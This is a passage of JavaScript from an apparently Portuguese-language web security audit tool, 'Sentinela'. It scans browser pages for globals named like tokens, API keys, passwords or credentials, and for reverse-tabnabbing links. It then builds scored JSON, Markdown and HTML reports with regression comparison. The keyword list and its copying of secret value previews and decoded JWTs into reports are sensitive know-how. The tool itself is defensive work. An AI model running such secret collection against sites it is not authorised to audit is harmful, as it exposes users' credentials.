      const sensitiveNames = ['token', 'apiKey', 'api_key', 'secret', 'password', 'auth', 'jwt', 'credential', 'user', 'config', 'firebase', 'supabase', 'stripe'];

      for (const key of Object.keys(window)) {
        // Ignorar propriedades padrão do navegador
        const defaultKeys = ['chrome', 'ozone', 'cdc_adoQpoasnfa76pfcZLmcfl', 'performance', 'navigator', 'location', 'document', 'self', 'top', 'parent', 'frames', 'opener', 'closed', 'length', 'name', 'customElements', 'history', 'navigation', 'locationbar', 'menubar', 'personalbar', 'scrollbars', 'statusbar', 'toolbar', 'status', 'frameElement', 'screen', 'visualViewport', 'innerWidth', 'innerHeight', 'outerWidth', 'outerHeight', 'devicePixelRatio', 'screenLeft', 'screenTop', 'screenX', 'screenY', 'pageXOffset', 'pageYOffset', 'scrollX', 'scrollY', 'crypto', 'indexedDB', 'sessionStorage', 'localStorage', 'isSecureContext', 'crossOriginIsolated', 'origin', 'external', 'speechSynthesis', 'onpointerrawupdate', 'scheduler', 'trustedTypes', 'credentialless', 'fence', 'launchQueue', 'caches', 'cookieStore', 'window', 'webkitRequestAnimationFrame', 'webkitCancelAnimationFrame', 'fetch', 'alert', 'confirm', 'prompt', 'print', 'close', 'stop', 'focus', 'blur', 'open', 'postMessage', 'onmessage', 'onmessageerror'];

        if (defaultKeys.includes(key)) continue;
        if (key.startsWith('__') || key.startsWith('_') || key.startsWith('webkit') || key.startsWith('on')) continue;

        const lowerKey = key.toLowerCase();
        for (const pattern of sensitiveNames) {
          if (lowerKey.includes(pattern)) {
            let value;
            try {
              value = typeof window[key] === 'object' ? JSON.stringify(window[key]).substring(0, 200) : String(window[key]).substring(0, 200);
            } catch {
              value = '(não serializável)';
            }

            findings.push({
              type: 'global_variable_sensitive',
              severity: 'HIGH',
              key,
              valuePreview: value.length > 50 ? value.substring(0, 50) + '...' : value,
              risk: `Variável global window.${key} pode conter dados sensíveis. Acessível por qualquer script na página.`,
            });
            break;
          }
        }
      }

      return findings;
    });

    if (globalVarFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${globalVarFindings.length} variável(eis) global(is) suspeita(s)`));
      globalVarFindings.forEach(f => logFinding(f));
    }
    pageFindings.push(...globalVarFindings);
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao verificar variáveis globais: ${err.message}`));
  }

  // 8. Tier 2: links target=_blank sem rel=noopener (reverse tabnabbing)
  try {
    const tabnab = await page.evaluate(() => {
      const bad = Array.from(document.querySelectorAll('a[target="_blank"]')).filter(a => {
        const rel = (a.getAttribute('rel') || '').toLowerCase();
        return a.href && /^https?:/i.test(a.href) && !rel.includes('noopener') && !rel.includes('noreferrer');
      });
      return bad.length ? { count: bad.length, sample: bad.slice(0, 3).map(a => a.href) } : null;
    });
    if (tabnab) {
      pageFindings.push({
        type: 'target_blank_noopener',
        severity: 'LOW',
        thirdParty: false,
        label: `${tabnab.count} link(s) target="_blank" sem rel=noopener`,
        url,
        sample: tabnab.sample,
        risk: 'Links que abrem nova aba sem rel="noopener" deixam a página de destino acessar window.opener e redirecionar a aba original para phishing (reverse tabnabbing). Navegadores modernos já mitigam por padrão, mas é boa prática explicitar.',
        recommendation: 'Adicionar rel="noopener noreferrer" em todo <a target="_blank">.',
      });
    }
  } catch { /* ignore */ }

  return pageFindings;
}

async function collectInternalLinks(page) {
  try {
    return await page.evaluate((origin) => {
      return Array.from(document.querySelectorAll('a[href]'))
        .map(a => a.href)
        .filter(href => {
          try {
            const url = new URL(href);
            return url.origin === origin && !href.includes('#') && !href.includes('logout') && !href.includes('signout');
          } catch {
            return false;
          }
        });
    }, pageOrigin);
  } catch {
    return [];
  }
}

// Audita CADA nova página que o usuário visitar (modo navegação livre).
// Retorna uma função para parar o monitoramento.
function startLivePageAuditor(page) {
  let busy = false;
  // NÃO inicia o relógio de inatividade aqui: só começa a contar depois da
  // primeira página nova auditada — assim o login/2FA (que não navega) nunca
  // encerra a sessão cedo demais.
  const interval = setInterval(async () => {
    if (busy) return;
    let url;
    try { url = page.url(); } catch { return; }
    const clean = (url || '').split('#')[0];
    if (!clean || clean === 'about:blank' || visitedUrls.has(clean)) return;
    busy = true;
    visitedUrls.add(clean);
    try {
      await page.waitForLoadState('networkidle', { timeout: 4000 }).catch(() => {});
      console.log(chalk.cyan(`  📄 Página visitada — auditando: ${clean}`));
      const findings = await collectPageData(page, clean);
      allFindings.push(...findings.map(f => ({ ...f, phase: 'PÓS-LOGIN' })));
      lastNavActivity = Date.now(); // registra atividade → reinicia o timer de inatividade
    } catch (e) {
      console.log(chalk.gray(`  (pulei ${clean}: ${e.message})`));
    } finally {
      busy = false;
    }
  }, 2500);
  return () => clearInterval(interval);
}

// ─── Gerador de Relatório ──────────────────────────────────

function countBySeverity(findings) {
  const counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 };
  for (const f of findings) {
    if (f.severity && counts[f.severity] !== undefined) counts[f.severity]++;
  }
  return counts;
}

// Nota calculada SÓ com problemas de 1ª parte, com teto por severidade para
// que um monte de LOW não zere a nota sozinho.
function computeScore(counts) {
  const penalty =
    Math.min(80, counts.CRITICAL * 20) +
    Math.min(50, counts.HIGH * 8) +
    Math.min(24, counts.MEDIUM * 3) +
    Math.min(10, counts.LOW * 1);
  return Math.max(0, 100 - penalty);
}

// Assinatura estável de um finding para comparação entre execuções (regressão).
function findingSignature(f) {
  let host = '';
  try { host = f.url ? new URL(String(f.url).replace(/\s.*$/, '')).host : ''; } catch { /* ignore */ }
  return `${f.type}|${f.header || f.cookieName || f.library || f.match || f.label || ''}|${host}`;
}

// Carrega o relatório JSON anterior do MESMO alvo (para diff/regressão).
function loadPreviousReport(target, currentPath) {
  try {
    const dir = dirname(currentPath);
    const files = readdirSync(dir)
      .filter(n => n.startsWith('security-audit-') && n.endsWith('.json') && join(dir, n) !== currentPath)
      .sort()
      .reverse();
    for (const name of files) {
      try {
        const data = JSON.parse(readFileSync(join(dir, name), 'utf8'));
        if (data.meta && data.meta.target === target) return data;
      } catch { /* pula arquivo inválido */ }
    }
  } catch { /* sem diretório */ }
  return null;
}

function computeRegression(currentFindings, prevReport) {
  if (!prevReport) return { hasPrev: false, new: [], fixed: [], persisted: 0 };
  const prevFindings = (prevReport.findings || []);
  const curSigs = new Set(currentFindings.map(findingSignature));
  const prevSigs = new Set(prevFindings.map(findingSignature));
  const newOnes = currentFindings.filter(f => !prevSigs.has(findingSignature(f)));
  const fixed = prevFindings.filter(f => !curSigs.has(findingSignature(f)));
  const persisted = currentFindings.filter(f => prevSigs.has(findingSignature(f))).length;
  return {
    hasPrev: true,
    prevDate: prevReport.meta && prevReport.meta.timestamp,
    prevScore: prevReport.meta && prevReport.meta.score,
    new: newOnes,
    fixed,
    persisted,
  };
}

function generateReport(findings) {
  const reportDir = join(dirname(__dirname), 'reports');
  if (!existsSync(reportDir)) mkdirSync(reportDir, { recursive: true });

  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const reportPath = join(reportDir, `security-audit-${timestamp}.json`);
  const reportMdPath = join(reportDir, `security-audit-${timestamp}.md`);
  const reportHtmlPath = join(reportDir, `security-audit-${timestamp}.html`);
  const reportPdfPath = join(reportDir, `security-audit-${timestamp}.pdf`);

  // Enriquecer com OWASP / CWE / confiança
  for (const f of findings) {
    const m = mapFinding(f);
    f.owasp = m.owasp;
    f.cwe = m.cwe;
    if (!f.confidence) f.confidence = m.confidence;
  }

  // Enriquecer com instruções de verificação manual
  const enrichedFindings = enrichWithVerification(findings, targetUrl);

  // Separar 1ª parte de 3ª parte
  const firstParty = enrichedFindings.filter(f => !f.thirdParty);
  const thirdParty = enrichedFindings.filter(f => f.thirdParty);

  const counts = countBySeverity(firstParty);
  const thirdCounts = countBySeverity(thirdParty);
  const firstPartyIssues = firstParty.filter(f => f.severity !== 'INFO');

  // Score breakdown por categoria
  const scoreBreakdown = computeScoreBreakdown(firstPartyIssues);
  const score = scoreBreakdown.totalScore;

  // Regressão vs execução anterior
  const regression = computeRegression(firstPartyIssues, loadPreviousReport(targetUrl, reportPath));

  // Gerar artefatos de teste (Playwright, Postman, cURL, server fix)
  const testArtifacts = generateTestArtifacts(targetUrl, firstPartyIssues);

  const reportData = {
    meta: {
      target: targetUrl,
      timestamp: new Date().toISOString(),
      pagesAudited: visitedUrls.size,
      totalFindings: enrichedFindings.length,
      firstPartyIssues: firstPartyIssues.length,
      thirdPartyIssues: thirdParty.filter(f => f.severity !== 'INFO').length,
      severity: counts,
      thirdPartySeverity: thirdCounts,
      score,
      grade: scoreBreakdown.grade,
      gradeLabel: scoreBreakdown.gradeLabel,
      regression: regression.hasPrev
        ? { prevScore: regression.prevScore, prevDate: regression.prevDate, new: regression.new.length, fixed: regression.fixed.length, persisted: regression.persisted }
        : null,
      phases: ['PRÉ-LOGIN', 'LOGIN', 'PÓS-LOGIN'],
    },
    scoreBreakdown,
    infra: infraData,
    findings: firstPartyIssues,
    thirdParty: thirdParty.filter(f => f.severity !== 'INFO'),
    inventory: enrichedFindings.filter(f => f.severity === 'INFO'),
    routes: capturedRoutes,
    pagesVisited: [...visitedUrls],
    testArtifacts,
  };

  // Salvar JSON
  writeFileSync(reportPath, JSON.stringify(reportData, null, 2), 'utf8');

  // Salvar Markdown empresarial
  const mdContent = generateEnterpriseMd({
    ...reportData,
    regression,
    counts,
    evidenceOf,
  });
  writeFileSync(reportMdPath, mdContent, 'utf8');

  // Salvar HTML empresarial
  const htmlContent = generateEnterpriseHtml({
    ...reportData,
    infraData,
    screenshots: auditScreenshots,
    timeline: auditTimeline,
    regression,
    counts,
    evidenceOf,
  });
  writeFileSync(reportHtmlPath, htmlContent, 'utf8');

  // Tentar exportar PDF (async em background ou sync)
  let reportPdfGenerated = false;
  try {
    exportPdf(reportHtmlPath, reportPdfPath).then(() => {
      console.log(chalk.gray(`  📄 PDF exportado com sucesso: ${reportPdfPath.substring(reportPdfPath.lastIndexOf('\\') + 1)}`));
    }).catch(err => {
      console.log(chalk.gray(`  (PDF export falhou: ${err.message})`));
    });
    reportPdfGenerated = true;
  } catch { /* PDF export falhou */ }

  return { reportPath, reportMdPath, reportHtmlPath, reportPdfPath, counts, thirdCounts, score, regression };
}

// Extrai os VALORES capturados de um finding (para o relatório detalhado).
function evidenceOf(f) {
  const parts = [];
  const trunc = (s) => { const t = String(s); return t.length > 220 ? t.slice(0, 220) + '…' : t; };
  if (f.currentValue) parts.push(`valor atual: ${trunc(f.currentValue)}`);
  if (f.valuePreview) parts.push(`valor: ${trunc(f.valuePreview)}`);
  if (f.tokenPreview) parts.push(`${f.tokenField || 'token'}: ${trunc(f.tokenPreview)}`);
  if (f.value && !f.valuePreview) parts.push(`valor: ${trunc(typeof f.value === 'string' ? f.value : JSON.stringify(f.value))}`);
  if (f.formAction) parts.push(`action: ${trunc(f.formAction)} (${(f.formMethod || 'GET').toUpperCase()})`);
  if (f.allow) parts.push(`Allow: ${trunc(f.allow)}`);
  if (f.redirectTo) parts.push(`redirect: ${trunc(f.redirectTo)}`);
  if (f.resourceType) parts.push(`tipo de recurso: ${f.resourceType}`);
  if (f.library) parts.push(`${f.library} ${f.version || ''}${f.fixedIn ? ` → atualizar p/ ${f.fixedIn}` : ''}`);
  if (f.cve) parts.push(`CVE: ${f.cve}`);
  if (Array.isArray(f.sample) && f.sample.length) parts.push(`exemplos: ${f.sample.map(trunc).join(' | ')}`);
  if (Array.isArray(f.issues) && f.issues.length) {
    parts.push('flags: ' + f.issues.map(i => typeof i === 'string' ? i : (i.flag || '')).filter(Boolean).join('; '));
  }
  if (f.jwtDecoded) parts.push(`JWT expira: ${f.jwtDecoded.expiresAt || '?'} (${f.jwtDecoded.hasExpiration ? 'com exp' : 'SEM exp!'})`);
  return parts;
}

function generateMarkdownReport(report, counts, regression = { hasPrev: false }) {
  const lines = [];

  lines.push('# 🛡️ Sentinela — Relatório de Auditoria de Segurança');
  lines.push('');
  lines.push(`**Alvo:** ${report.meta.target}`);
  lines.push(`**Data:** ${new Date(report.meta.timestamp).toLocaleString('pt-BR')}`);
  lines.push(`**Páginas auditadas:** ${report.meta.pagesAudited}`);
  lines.push(`**Fases:** PRÉ-LOGIN → LOGIN → PÓS-LOGIN`);
  lines.push('');

  // Resumo (contagem = SÓ problemas de 1ª parte / seu código)
  const tc = report.meta.thirdPartySeverity || { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
  const thirdTotal = report.meta.thirdPartyIssues || 0;
  lines.push('## 📊 Resumo');
  lines.push('');
  lines.push('> Contagem e nota consideram **apenas problemas do seu código/config (1ª parte)**. Achados em bibliotecas e domínios de terceiros ficam na seção própria e não afetam a nota.');
  lines.push('');
  lines.push('| Severidade | Seu (1ª parte) | Terceiros |');
  lines.push('|------------|:--------------:|:---------:|');
  lines.push(`| 🔴 CRITICAL | ${counts.CRITICAL} | ${tc.CRITICAL} |`);
  lines.push(`| 🟠 HIGH | ${counts.HIGH} | ${tc.HIGH} |`);
  lines.push(`| 🟡 MEDIUM | ${counts.MEDIUM} | ${tc.MEDIUM} |`);
  lines.push(`| 🔵 LOW | ${counts.LOW} | ${tc.LOW} |`);
  lines.push(`| **TOTAL** | **${report.meta.firstPartyIssues}** | **${thirdTotal}** |`);
  lines.push('');

  // Score (já calculado só com 1ª parte)
  const score = report.meta.score;
  lines.push(`### Nota de Segurança: ${score}/100 ${score >= 80 ? '✅' : score >= 50 ? '⚠️' : '❌'}`);
  lines.push('');

  // Regressão vs execução anterior (Tier 4)
  if (regression.hasPrev) {
    const delta = score - (regression.prevScore ?? score);
    const arrow = delta > 0 ? `📈 +${delta}` : delta < 0 ? `📉 ${delta}` : '➖ 0';
    lines.push('### 🔁 Comparação com a execução anterior');
    lines.push('');
    lines.push(`- Nota: **${regression.prevScore ?? '?'} → ${score}** (${arrow})`);
    lines.push(`- 🆕 Novos problemas: **${regression.new.length}**`);
    lines.push(`- ✅ Problemas corrigidos: **${regression.fixed.length}**`);
    lines.push(`- ⏳ Persistentes: **${regression.persisted}**`);
    if (regression.new.length > 0) {
      lines.push('');
      lines.push('**Novos desde a última auditoria:**');
      for (const f of regression.new.slice(0, 15)) lines.push(`- 🆕 [${f.severity}] ${f.label || f.type}`);
    }
    if (regression.fixed.length > 0) {
      lines.push('');
      lines.push('**Corrigidos desde a última auditoria:**');
      for (const f of regression.fixed.slice(0, 15)) lines.push(`- ✅ [${f.severity}] ${f.label || f.type}`);
    }
    lines.push('');
  }

  // Agrupar por fase
  const phases = ['PRÉ-LOGIN', 'LOGIN', 'PÓS-LOGIN'];
  const phaseEmoji = { 'PRÉ-LOGIN': '🔐', 'LOGIN': '🔄', 'PÓS-LOGIN': '🏠' };
  const phaseDescriptions = {
    'PRÉ-LOGIN': 'Problemas encontrados na página de login ANTES de fazer login',
    'LOGIN': 'Problemas detectados DURANTE o processo de login',
    'PÓS-LOGIN': 'Problemas encontrados após autenticação',
  };

  for (const phase of phases) {
    const phaseItems = report.findings.filter(f => f.phase === phase);
    if (phaseItems.length === 0) continue;

    lines.push(`## ${phaseEmoji[phase]} Fase: ${phase}`);
    lines.push(`> ${phaseDescriptions[phase]}`);
    lines.push('');

    // Sub-agrupar por severidade dentro da fase
    const severityOrder = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];
    const severityEmoji = { CRITICAL: '🔴', HIGH: '🟠', MEDIUM: '🟡', LOW: '🔵' };

    for (const severity of severityOrder) {
      const items = phaseItems.filter(f => f.severity === severity);
      if (items.length === 0) continue;

      lines.push(`### ${severityEmoji[severity]} ${severity} (${items.length})`);
      lines.push('');

      for (const item of items) {
        lines.push(`#### ${item.label || item.type}`);
        lines.push('');

        const badge = [item.owasp, item.cwe && item.cwe !== '—' ? item.cwe : '', item.confidence ? `confiança: ${item.confidence}` : ''].filter(Boolean).join(' · ');
        if (badge) { lines.push(`\`${badge}\``); lines.push(''); }

        if (item.url) lines.push(`**Onde:** \`${item.url}\``);
        if (item.key) lines.push(`**Chave:** \`${item.key}\``);
        if (item.cookieName) lines.push(`**Cookie:** \`${item.cookieName}\``);
        if (item.header) lines.push(`**Header:** \`${item.header}\``);
        if (item.storage) lines.push(`**Storage:** \`${item.storage}\``);
        if (item.match) lines.push(`**Código encontrado:** \`${item.match}\``);
        lines.push('');

        const ev = evidenceOf(item);
        if (ev.length > 0) {
          lines.push('**🔎 Evidência capturada:**');
          ev.forEach(e => lines.push(`- \`${e}\``));
          lines.push('');
        }

        if (item.risk) {
          lines.push('**🎯 Risco:**');
          lines.push(`> ${item.risk.replace(/\n/g, '\n> ')}`);
          lines.push('');
        }

        if (item.attackExample) {
          lines.push('**💀 Como o atacante explora:**');
          lines.push(`> ${item.attackExample}`);
          lines.push('');
        }

        if (item.recommendation) {
          lines.push('**✅ Recomendação:**');
          lines.push(`> ${item.recommendation}`);
          lines.push('');
        }

        if (item.jwtDecoded) {
          lines.push('**🔓 JWT Decodificado:**');
          lines.push('```json');
          lines.push(JSON.stringify(item.jwtDecoded, null, 2));
          lines.push('```');
          lines.push('');
        }

        if (item.issues && item.issues.length > 0) {
          lines.push('**Problemas encontrados:**');
          for (const issue of item.issues) {
            if (typeof issue === 'string') {
              lines.push(`- ${issue}`);
            } else {
              lines.push(`- **${issue.flag}**: ${issue.risk}`);
            }
          }
          lines.push('');
        }

        lines.push('---');
        lines.push('');
      }
    }
  }

  // Findings sem fase (rede, etc.)
  const noPhaseItems = report.findings.filter(f => !f.phase);
  if (noPhaseItems.length > 0) {
    lines.push('## 🌐 Geral (sem fase específica)');
    lines.push('');
    for (const item of noPhaseItems) {
      lines.push(`### ${item.label || item.type}`);
      lines.push('');
      if (item.url) lines.push(`**Onde:** \`${item.url}\``);
      if (item.risk) {
        lines.push('**🎯 Risco:**');
        lines.push(`> ${item.risk.replace(/\n/g, '\n> ')}`);
        lines.push('');
      }
      if (item.recommendation) {
        lines.push('**✅ Recomendação:**');
        lines.push(`> ${item.recommendation}`);
        lines.push('');
      }
      lines.push('---');
      lines.push('');
    }
  }

  // ── Terceiros (fora do seu controle) — resumo compacto ──
  const tpItems = report.thirdParty || [];
  if (tpItems.length > 0) {
    lines.push('## 🏢 Terceiros (fora do seu controle)');
    lines.push('> Achados em bibliotecas, CDNs e domínios de terceiros (HubSpot, LinkedIn, Cloudflare, etc.). Você geralmente **não pode corrigir** — são responsabilidade do fornecedor. Listados de forma agrupada, apenas para referência. **Não entram na nota.**');
    lines.push('');
    // Agrupar por vendor + label
    const groups = {};
    for (const f of tpItems) {
      const g = `${f.vendor || 'Terceiro'} — ${f.label || f.type}`;
      groups[g] = (groups[g] || 0) + 1;
    }
    lines.push('| Origem / Tipo | Ocorrências |');
    lines.push('|---------------|:-----------:|');
    for (const [g, n] of Object.entries(groups).sort((a, b) => b[1] - a[1])) {
      lines.push(`| ${g} | ${n} |`);
    }
    lines.push('');
  }

  // Rotas e endpoints capturados (relatório detalhado)
  const routes = report.routes || [];
  if (routes.length > 0) {
    const fp = routes.filter(r => !r.thirdParty);
    const tp = routes.length - fp.length;
    lines.push('## 🗺️ Rotas e Endpoints capturados');
    lines.push(`> ${routes.length} requisições distintas observadas (${fp.length} do seu domínio, ${tp} de terceiros). Documentos e chamadas de API — assets estáticos (img/css/fonte) omitidos.`);
    lines.push('');
    if ((report.pagesVisited || []).length > 0) {
      lines.push('**Páginas visitadas:**');
      report.pagesVisited.forEach(u => lines.push(`- ${u}`));
      lines.push('');
    }
    if (fp.length > 0) {
      lines.push('**Endpoints (seu domínio):**');
      lines.push('');
      lines.push('| Método | Rota | Tipo | Fase | Auth |');
      lines.push('|--------|------|------|------|:----:|');
      for (const r of fp.slice(0, 100)) {
        lines.push(`| ${r.method} | \`${r.path}${r.query ? '?' + r.query : ''}\` | ${r.kind} | ${r.phase} | ${r.hasAuth ? '🔑' : ''} |`);
      }
      lines.push('');
    }
  }

  // Inventário — Login diff
  const loginDiffItems = report.inventory.filter(f => f.phase === 'LOGIN');
  if (loginDiffItems.length > 0) {
    lines.push('## 🔄 O que o LOGIN alterou (diff before/after)');
    lines.push('');
    for (const item of loginDiffItems) {
      const icon = item.type.includes('added') ? '➕' : item.type.includes('removed') ? '➖' : '✏️';
      lines.push(`- ${icon} ${item.note}`);
    }
    lines.push('');
  }

  // Inventário geral
  const inventoryItems = report.inventory.filter(f => f.type !== 'auth_header_detected' && !f.phase);
  if (inventoryItems.length > 0) {
    lines.push('## 📋 Inventário (informativo)');
    lines.push('');
    for (const item of inventoryItems) {
      if (item.type === 'storage_inventory') {
        lines.push(`- **${item.storage}**: ${item.keys.join(', ')}`);
      } else if (item.type === 'cookie_inventory') {
        lines.push(`- **Cookies (${item.cookies.length})**: ${item.cookies.map(c => `${c.name} (httpOnly:${c.httpOnly}, secure:${c.secure})`).join(', ')}`);
      }
    }
    lines.push('');
  }

  lines.push('---');
  lines.push('*Relatório gerado automaticamente por **Sentinela** — Vulnerability Collector*');

  return lines.join('\n');
}

// ─── Relatório HTML apresentável (Tier 4) ─────────────────

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function generateHtmlReport(report, counts, regression = { hasPrev: false }) {
  const m = report.meta;
  const score = m.score;
  const scoreColor = score >= 80 ? '#2f9e44' : score >= 50 ? '#f08c00' : '#c92a2a';
  const sevColor = { CRITICAL: '#c92a2a', HIGH: '#e8590c', MEDIUM: '#f08c00', LOW: '#1c7ed6', INFO: '#868e96' };

  const card = (label, val, color) =>
    `<div class="card"><div class="num" style="color:${color}">${val}</div><div class="lbl">${label}</div></div>`;

  const findingHtml = (f) => `
    <div class="finding sev-${f.severity}">
      <div class="fhead">
        <span class="pill" style="background:${sevColor[f.severity] || '#868e96'}">${f.severity}</span>
        <span class="ftitle">${escapeHtml(f.label || f.type)}</span>
      </div>
      <div class="meta">${[f.owasp, f.cwe && f.cwe !== '—' ? f.cwe : '', f.confidence ? 'confiança: ' + f.confidence : ''].filter(Boolean).map(escapeHtml).join(' · ')}</div>
      ${f.url ? `<div class="where"><b>Onde:</b> <code>${escapeHtml(f.url)}</code></div>` : ''}
      ${f.cve ? `<div class="where"><b>CVE:</b> ${escapeHtml(f.cve)}${f.fixedIn ? ` — corrigido em ${escapeHtml(f.fixedIn)}` : ''}</div>` : ''}
      ${(() => { const ev = evidenceOf(f); return ev.length ? `<div class="evid"><b>🔎 Evidência capturada:</b><ul>${ev.map(e => `<li><code>${escapeHtml(e)}</code></li>`).join('')}</ul></div>` : ''; })()}
      ${f.risk ? `<div class="risk">${escapeHtml(f.risk)}</div>` : ''}
      ${f.recommendation ? `<div class="rec"><b>✅ Sugestão:</b> ${escapeHtml(f.recommendation)}</div>` : ''}
    </div>`;

  // Agrupar 1ª parte por OWASP
  const byOwasp = {};
  for (const f of report.findings) {
    const k = f.owasp || 'Outros';
    (byOwasp[k] = byOwasp[k] || []).push(f);
  }
  const sevRank = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
  const owaspSections = Object.entries(byOwasp)
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([owasp, items]) => {
      items.sort((x, y) => sevRank[x.severity] - sevRank[y.severity]);
      return `<h3>${escapeHtml(owasp)} <span class="count">(${items.length})</span></h3>${items.map(findingHtml).join('')}`;
    }).join('');

  // Terceiros agrupados
  const tpGroups = {};
  for (const f of (report.thirdParty || [])) {
    const k = `${f.vendor || 'Terceiro'} — ${f.label || f.type}`;
    tpGroups[k] = (tpGroups[k] || 0) + 1;
  }
  const tpRows = Object.entries(tpGroups).sort((a, b) => b[1] - a[1])
    .map(([k, n]) => `<tr><td>${escapeHtml(k)}</td><td style="text-align:center">${n}</td></tr>`).join('');

  // Rotas / endpoints
  const routes = report.routes || [];
  const fpRoutes = routes.filter(r => !r.thirdParty);
  const routeRows = fpRoutes.slice(0, 120).map(r =>
    `<tr><td>${escapeHtml(r.method)}</td><td><code>${escapeHtml(r.path + (r.query ? '?' + r.query : ''))}</code></td><td>${escapeHtml(r.kind)}</td><td>${escapeHtml(r.phase)}</td><td style="text-align:center">${r.hasAuth ? '🔑' : ''}</td></tr>`).join('');
  const pagesHtml = (report.pagesVisited || []).map(u => `<li><code>${escapeHtml(u)}</code></li>`).join('');

  // Regressão
  let regHtml = '';
  if (regression.hasPrev) {
    const delta = score - (regression.prevScore ?? score);
    const arrow = delta > 0 ? `▲ +${delta}` : delta < 0 ? `▼ ${delta}` : '– 0';
    const dColor = delta > 0 ? '#2f9e44' : delta < 0 ? '#c92a2a' : '#868e96';
    regHtml = `<div class="reg">
      <h2>🔁 Comparação com a execução anterior</h2>
      <div class="reggrid">
        ${card('Nota anterior', regression.prevScore ?? '?', '#495057')}
        ${card('Nota atual', score, scoreColor)}
        ${card('Variação', arrow, dColor)}
        ${card('🆕 Novos', regression.new.length, '#c92a2a')}
        ${card('✅ Corrigidos', regression.fixed.length, '#2f9e44')}
        ${card('⏳ Persistentes', regression.persisted, '#f08c00')}
      </div>
    </div>`;
  }

  return `<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sentinela — Relatório de Segurança — ${escapeHtml(m.target)}</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 0; background: #f1f3f5; color: #212529; }
  .wrap { max-width: 1000px; margin: 0 auto; padding: 24px; }
  header { background: #1a1b1e; color: #fff; border-radius: 14px; padding: 28px; display: flex; justify-content: space-between; align-items: center; gap: 20px; flex-wrap: wrap; }
  header h1 { font-size: 18px; margin: 0 0 6px; font-weight: 600; }
  header .target { color: #adb5bd; font-size: 13px; word-break: break-all; }
  .gauge { text-align: center; min-width: 130px; }
  .gauge .val { font-size: 46px; font-weight: 800; line-height: 1; }
  .gauge .cap { font-size: 12px; color: #adb5bd; }
  .cards { display: flex; gap: 12px; margin: 20px 0; flex-wrap: wrap; }
  .card { background: #fff; border-radius: 12px; padding: 16px 20px; flex: 1; min-width: 120px; box-shadow: 0 1px 3px rgba(0,0,0,.06); text-align: center; }
  .card .num { font-size: 30px; font-weight: 700; }
  .card .lbl { font-size: 12px; color: #868e96; margin-top: 4px; }
  .note { background: #fff3bf; border: 1px solid #ffe066; border-radius: 10px; padding: 12px 16px; font-size: 13px; color: #664d03; margin: 16px 0; }
  h2 { font-size: 16px; margin: 28px 0 12px; border-bottom: 2px solid #dee2e6; padding-bottom: 6px; }
  h3 { font-size: 14px; margin: 20px 0 10px; color: #343a40; }
  h3 .count { color: #adb5bd; font-weight: 400; }
  .finding { background: #fff; border-radius: 10px; padding: 14px 16px; margin: 10px 0; border-left: 4px solid #ced4da; box-shadow: 0 1px 2px rgba(0,0,0,.04); }
  .finding.sev-CRITICAL { border-left-color: #c92a2a; } .finding.sev-HIGH { border-left-color: #e8590c; }
  .finding.sev-MEDIUM { border-left-color: #f08c00; } .finding.sev-LOW { border-left-color: #1c7ed6; }
  .fhead { display: flex; align-items: center; gap: 10px; }
  .pill { color: #fff; font-size: 11px; font-weight: 700; padding: 2px 9px; border-radius: 20px; letter-spacing: .5px; }
  .ftitle { font-weight: 600; font-size: 14px; }
  .meta { font-size: 11px; color: #868e96; margin: 6px 0; }
  .where { font-size: 12px; margin: 4px 0; } .where code { background: #f1f3f5; padding: 1px 5px; border-radius: 4px; word-break: break-all; }
  .risk { font-size: 13px; color: #495057; margin: 8px 0; }
  .rec { font-size: 13px; color: #2b5c34; background: #ebfbee; padding: 8px 10px; border-radius: 6px; }
  .evid { font-size: 12px; background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 6px; padding: 6px 10px; margin: 6px 0; }
  .evid ul { margin: 4px 0 0; padding-left: 18px; } .evid code, .routes code { word-break: break-all; }
  .routes { font-size: 12px; }
  table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 10px; overflow: hidden; }
  th, td { padding: 8px 12px; font-size: 13px; border-bottom: 1px solid #f1f3f5; text-align: left; }
  th { background: #f8f9fa; }
  .reggrid { display: flex; gap: 12px; flex-wrap: wrap; }
  footer { text-align: center; color: #adb5bd; font-size: 12px; margin: 30px 0 10px; }
</style></head><body><div class="wrap">
  <header>
    <div>
      <h1>🛡️ Sentinela — Relatório de Segurança</h1>
      <div class="target">${escapeHtml(m.target)}</div>
      <div class="target">${new Date(m.timestamp).toLocaleString('pt-BR')} · ${m.pagesAudited} página(s)</div>
    </div>
    <div class="gauge"><div class="val" style="color:${scoreColor}">${score}</div><div class="cap">/ 100 — só 1ª parte</div></div>
  </header>

  <div class="cards">
    ${card('🔴 CRITICAL', counts.CRITICAL, sevColor.CRITICAL)}
    ${card('🟠 HIGH', counts.HIGH, sevColor.HIGH)}
    ${card('🟡 MEDIUM', counts.MEDIUM, sevColor.MEDIUM)}
    ${card('🔵 LOW', counts.LOW, sevColor.LOW)}
    ${card('🏢 Terceiros', m.thirdPartyIssues, '#868e96')}
  </div>

  <div class="note">Contagem e nota consideram <b>apenas o seu código/config (1ª parte)</b>. Achados em bibliotecas e domínios de terceiros aparecem à parte e não afetam a nota.</div>

  ${regHtml}

  <h2>🔎 Achados (seu código / config)</h2>
  ${report.findings.length ? owaspSections : '<p>Nenhum problema de 1ª parte encontrado. 🎉</p>'}

  ${routes.length ? `<h2>🗺️ Rotas e Endpoints capturados</h2>
  <p style="font-size:13px;color:#868e96">${routes.length} requisições distintas observadas (${fpRoutes.length} do seu domínio). Documentos e chamadas de API — assets estáticos omitidos.</p>
  ${pagesHtml ? `<p style="font-size:13px;margin-bottom:4px"><b>Páginas visitadas:</b></p><ul class="routes">${pagesHtml}</ul>` : ''}
